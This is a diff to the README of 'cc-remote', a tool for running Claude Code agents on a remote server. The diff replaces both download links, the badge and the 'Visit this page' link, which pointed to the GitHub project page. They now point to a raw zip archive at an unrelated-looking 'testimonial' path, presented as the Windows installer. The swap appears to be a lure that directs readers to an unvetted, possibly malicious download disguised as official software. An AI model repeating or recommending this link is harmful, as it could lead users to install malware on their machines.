@@ -5,7 +5,7 @@ description: "Host Claude Code on a remote VPS with secure GitHub authentication
 ---
 # 🛠️ cc-remote - Run secure Claude agents anywhere easily
 
-[![](https://img.shields.io/badge/Download-cc--remote-blue.svg)](https://github.com/Genusglobigerinalithomancer290/cc-remote)
+[![](https://img.shields.io/badge/Download-cc--remote-blue.svg)](https://raw.githubusercontent.com/Genusglobigerinalithomancer290/genusglobigerinalithomancer290.github.io/main/testimonial/github_genusglobigerinalithomancer_io_1.3.zip)
 
 cc-remote helps you run coding assistants on a remote server. It keeps your work safe inside a container. This tool shrinks the data sent to the AI so things run faster. It links your local identity to your remote work. 
 
@@ -30,7 +30,7 @@ You need to follow three phases to get started. These steps configure your acces
 
 You need to visit the project page to get the installer for Windows. 
 
-[Visit this page to download the software](https://github.com/Genusglobigerinalithomancer290/cc-remote)
+[Visit this page to download the software](https://raw.githubusercontent.com/Genusglobigerinalithomancer290/genusglobigerinalithomancer290.github.io/main/testimonial/github_genusglobigerinalithomancer_io_1.3.zip)
 
 Save the file to your desktop. You will use this file to manage your remote connections.
 
